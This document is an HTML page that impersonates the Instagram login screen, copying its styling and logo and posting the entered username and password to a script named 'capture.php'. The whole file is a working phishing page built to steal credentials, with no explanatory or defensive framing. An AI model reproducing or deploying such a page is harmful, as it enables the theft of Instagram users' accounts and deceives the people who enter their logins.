<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <title>Instagram</title>
    <meta name='viewport' content='width=device-width, initial-scale=1'>
    <link rel='stylesheet' href='https://fonts.googleapis.com/css?family=Roboto:400,700'>
    <style>
        body { background: #fafafa; font-family: Roboto, Arial, sans-serif; }
        .container { max-width: 350px; margin: 60px auto; background: #fff; border: 1px solid #dbdbdb; border-radius: 8px; padding: 40px 40px 24px 40px; }
        .logo { display: block; margin: 0 auto 32px; width: 180px; }
        .input { width: 100%; padding: 10px; margin-bottom: 8px; border: 1px solid #dbdbdb; border-radius: 4px; font-size: 15px; background: #fafafa; }
        .btn { width: 100%; background: #3897f0; color: #fff; border: none; border-radius: 4px; padding: 10px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 8px; }
        .btn:hover { background: #1877f2; }
        .forgot { display: block; text-align: center; margin: 16px 0; color: #00376b; text-decoration: none; font-size: 14px; }
    </style>
</head>
<body>
    <div class='container'>
        <img src='https://instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png' class='logo' alt='Instagram'>
        <form action="capture.php" method='POST'>
            <input class='input' type='text' name='username' placeholder='Phone number, username, or email' required>
            <input class='input' type='password' name='password' placeholder='Password' required>
            <button class='btn' type='submit'>Log In</button>
        </form>
        <a class='forgot' href='#'>Forgot password?</a>
    </div>
</body>
</html>
